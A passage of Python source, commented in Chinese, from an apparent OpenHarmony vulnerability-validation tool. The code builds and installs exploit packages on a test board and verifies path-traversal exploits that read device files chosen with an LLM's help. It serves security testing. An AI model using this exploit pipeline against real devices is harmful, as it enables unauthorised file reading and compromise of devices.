                victim_source=evidence.get("victim_source", ""),
                source_snapshots=source_snapshots,
            )
        emit("Exp 契约已生成，构建 exp.hap…")
        # 3. 构建 exp.hap（复用 HapTransport.build；独立 out_dir 防覆盖 poc 工程）
        # 调用方保证 sys.path 已注入 utilities_dir（scan_artifact_bridge 已做）。
        from openharmony_dynamic.transports.hap import HapTransport  # noqa: PLC0415

        # 契约对象只用于给 Runner/HapTransport 提供结构化字段；
        # 从 PoC to_dict 重建而非手写 from_dict——保持单一序列化权威。
        field_values = dict(exp_contract.get("protocol", {}).get("field_values", {}))
        for required in ("mode", "host", "port"):
            if required not in field_values:
                raise ValueError(f"exp 契约缺 field_values[{required!r}]，无法构建 HAP")
        field_values["marker"] = dst  # HAP 模板 __MARKER__ 占位符展示用
        # frame 插槽（HAP 模板 first/second/third）：与 runner._resolve_params 同源逻辑
        proto = exp_contract.get("protocol", {})
        param_space = proto.get("param_space", {}) or {}
        first_tpl = field_values.get("frame_first_template") or param_space.get("frame_first_template", "")
        second_tpl = field_values.get("frame_second") or param_space.get("frame_second", "")
        field_values["first"] = first_tpl.replace("__MARKER_PATH__", dst)
        field_values["second"] = second_tpl
        field_values["target"] = poc_contract.get("contract_id", "")
        hap = HapTransport(hdc, work_root=Path(run_dir / "hap_build"))
        exp_hap_path = hap.build(field_values, contract_id=exp_contract["contract_id"])
        emit("exp.hap 构建完成，板卡执行验证中…")
        # 4. 板卡执行验证（install/start → 效果窗口 → oracle 快照），走 HapTransport 全管线
        send = hap.install_and_start(exp_hap_path)
        import time as _time
        _time.sleep(6.0)
        # 效果实证：直接查 dst 是否落地（stat + 大小 + 首字节哈希）
        stat_out = hdc.run(
            ["shell", "sh", "-c",
             f"ls -l '{dst}' 2>&1; stat -c '%s %Y' '{dst}' 2>&1; sha256sum '{dst}' 2>&1 | head -c 80"],
            purpose="exp:verify-takeout",
        )
        effect_ok = ("No such file" not in stat_out.stdout) and stat_out.returncode == 0
        evidence = {
            "exp_contract_id": exp_contract["contract_id"],
            "victim_path": victim,
            "victim_source": victim_source,
            "dst_path": dst,
            "reachability": send.reachability,
            "effect_observed": effect_ok,
            "verify_stdout": stat_out.stdout[-1000:],
        }
        (out_dir / "evidence_exp.json").write_text(
            json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        emit("Exp 验证完成：" + ("效果已实证" if effect_ok else "效果未观测（证据已留档）"))
        # 5. 收集交付文件
        files: list[dict[str, Any]] = []
        def _reg(path: Path, name: str) -> None:
            """外部产物 → deliverables/<name>；src 即目标文件时仅登记（SameFileError）。"""
            if not path.is_file():
                return
            target = out_dir / name
            if path.resolve() != target.resolve():
                shutil.copy2(path, target)
            files.append({"name": name, "path": str(target), "bytes": target.stat().st_size})
        if poc_hap is not None and poc_hap.is_file():
            _reg(poc_hap, "poc.hap")
        _reg(exp_hap_path, "exp.hap")
        # 触发应用源码（Index.ets 参数化产物）：hap 是二进制包没法直接看，
        # 用户要在前端看到"这个 HAP 到底发了什么报文"——把载荷常量所在源码
        # 存进交付物。PoC 的构建目录在系统临时目录（重启会丢），必须复制；
        # Exp 的构建目录在 run_dir/hap_build/ 下（持久），同样复制保证自包含。
        for src_dir, name in ((poc_hap.parent if poc_hap else None, "poc_source_Index.ets"),
                              (exp_hap_path.parent, "exp_source_Index.ets")):
            if src_dir is None:
                continue
            idx = src_dir / "project" / "Entry" / "src" / "main" / "ets" / "pages" / "Index.ets"
            if idx.is_file():
                shutil.copy2(idx, out_dir / name)
        # 除了保留参数化入口文件，还复制整个可重建工程，便于用户检查模块配置、
        # Ability 声明和所有源码，而不是只能看到一段载荷常量。
        source_snapshots: dict[str, Any] = {}
        poc_snapshot = _package_source_snapshot(
            (poc_hap.parent / "project") if poc_hap else None, out_dir, "poc")
        exp_snapshot = _package_source_snapshot(exp_hap_path.parent / "project", out_dir, "exp")
        if poc_snapshot:
            source_snapshots["poc"] = poc_snapshot
        if exp_snapshot:
            source_snapshots["exp"] = exp_snapshot
        (out_dir / "contract_poc.json").write_text(
            json.dumps(poc_contract, ensure_ascii=False, indent=2), encoding="utf-8")
        (out_dir / "contract_exp.json").write_text(
            json.dumps(exp_contract, ensure_ascii=False, indent=2), encoding="utf-8")
        _write_readme(out_dir, poc_contract, exp_contract, evidence, victim_source)
        for name in ("README.md", "evidence_exp.json", "contract_poc.json", "contract_exp.json",
                     "poc_source_Index.ets", "exp_source_Index.ets"):
            _reg(out_dir / name, name)
        _register_source_snapshot_files(out_dir, poc_snapshot, files)
        _register_source_snapshot_files(out_dir, exp_snapshot, files)
        hap.cleanup()
        return ExpPackage(status="packaged", deliverables_dir=str(out_dir), files=files,
                          exp_verdict=evidence, exp_payload=exp_contract["fault"]["description"],
                          victim_path=victim, victim_source=victim_source,
                          source_snapshots=source_snapshots)
    except Exception as exc:  # noqa: BLE001
        return ExpPackage(status="failed", reason=f"{type(exc).__name__}: {exc}",
                          deliverables_dir=str(run_dir / "deliverables"))


def _build_path_traversal_exp(*, poc_contract: dict[str, Any], finding: Any,
                              hdc, binding_pair, emit, run_dir: Path) -> dict[str, Any] | None:
    """path_traversal Exp：探测真实目标 → LLM 挑选 → 构造契约 → 板卡实测。

    生成即验证：exp 契约在本板执行（native 载体直发，复用 Runner 同款预埋/
    hilog/输出面扫描原语），输出面出现 victim 内容指纹 = effect_observed。
    任何失败返回 None（调用方折叠为 skipped），绝不产出未验证的纸面 exp。
    """
    try:
        import time as _time

        from openharmony_dynamic.contracts import contract_from_dict  # noqa: PLC0415
        from openharmony_dynamic.hdc_client import HDCClient  # noqa: PLC0415  (type only)
        from openharmony_dynamic.observation.oracles import (  # noqa: PLC0415
            plant_exfil_file,
        )
        from openharmony_dynamic.observation.snapshot import dump_hilog, filter_hilog  # noqa: PLC0415
        from openharmony_dynamic.runner import Runner  # noqa: PLC0415
        from openharmony_dynamic.transports.native_unix import NativeUnixTransport  # noqa: PLC0415

        # 1. 候选探测（确定性，P2 动态化）：优先设备动态探测（ls 目标域目录 +
        # stat 过滤，候选总来自本台设备当下真实存在的文件）；动态探测为空时
        # 回落静态清单二次确认（老行为，保底）。
        existing = _probe_pt_victims_dynamic(hdc)
        if existing:
            emit(f"victim 动态探测命中 {len(existing)} 个候选（P2）")
        else:
            existing = _probe_device_files(hdc, _PT_FALLBACK_VICTIMS)
        if not existing:
            emit("path_traversal Exp 跳过：设备上未探测到可读取目标")
            return None
        # 2. LLM 挑选（白名单约束，失败取探测序首个）
        victim = _llm_pick_pt_victim(binding_pair, poc_contract, existing)
        victim_source = "llm" if victim else "probe_first"
        victim = victim or existing[0]
        emit(f"Exp 读取目标：{victim}（{victim_source}）")
        # 3. 契约构造（读取路径槽位升级）
        exp_contract = _build_pt_exp_contract(poc_contract, victim, "")
        if exp_contract is None:
            emit("path_traversal Exp 跳过：契约中未定位到读取路径槽位")
            return None
        # 4. victim 内容指纹**先**实测提取并回填 oracle（surface 扫描的 needle
        #    取契约 content_contains，run 时必须已是真实指纹——__PT_VICTIM_FINGERPRINT__
        #    占位若带进 run 会永不命中 → 假阴性）
        try:
            cat = hdc.run(["shell", "head", "-c", "256", victim],
                          purpose="exp:pt-fingerprint")
            # 指纹必须是**原文里真实存在的行内子串**（surface 核对是对 cat 全文
            # 的子串匹配；run 6bf231 实证：把 64 字节内的 \n 过滤掉再拼接会产生
            # 原文不存在的跨行伪子串 → 永不命中 → 假阴性）。取首个非空行的
            # 前 24 个可打印字符——行内截取，cat 全文必含该子串。
            fingerprint = ""
            for line in cat.stdout.splitlines():
                printable = "".join(ch for ch in line if 32 <= ord(ch) < 127)
                printable = printable.strip()
                if len(printable) >= 8:
                    fingerprint = printable[:24]
                    break
        except Exception:  # noqa: BLE001 — 指纹提取失败不阻断证据落盘
            fingerprint = ""
        if fingerprint:
            for form in exp_contract["oracle"]["artifact_forms"]:
                if form.get("form") == "exfil":
                    form["content_contains"] = fingerprint
        else:
            emit("警告：victim 指纹提取为空，surface 核对回退 run_pattern 语义")
        # 5. 板卡实测：Runner 全管线（占位符展开/预埋/surface 扫描/oracle/verdict）
        #    victim 路径以真实绝对路径写入 field_values（非占位符）——
        #    Exp 契约不经 validate_contract 硬校验（它只在编译期跑，/system/
        #    前缀会被 V9 拦截），但经 contract_from_dict 结构化 + Runner 占位符
        #    展开约束（victim 无 __ 嵌入即原样发送）+ param_space.exp_no_plant_paths
        #    豁免其 rm/预埋 + cleanup 只清预埋文件。
        contract = contract_from_dict(exp_contract)
        rec = Runner(hdc, on_event=(lambda e: emit(str(e.get("detail", ""))))).run(contract)
        effect_ok = bool(
            rec.verdict.get("effect") == "EFFECT_OBSERVED"
            or any(h for h in rec.hilog_hits)
        )
        evidence = {
            "exp_contract_id": exp_contract["contract_id"],
            "victim_path": victim,
            "victim_source": victim_source,
            "run_id": rec.run_id,
            "pattern": rec.pattern,
            "reachability": rec.reachability,
            "effect_observed": effect_ok,
            "fingerprint": fingerprint,
            "verdict": rec.verdict,
            "hilog_hits": rec.hilog_hits,
        }
        exp_contract["_evidence"] = evidence
        emit("path_traversal Exp 验证完成：" + ("效果已实证" if effect_ok else "效果未观测（证据已留档）"))
        return exp_contract
    except Exception as exc:  # noqa: BLE001 — Exp 是增量增强，失败不伤主结果
        try:
            emit(f"path_traversal Exp 构建失败：{type(exc).__name__}: {exc}")
        except Exception:  # noqa: BLE001
            pass
        return None
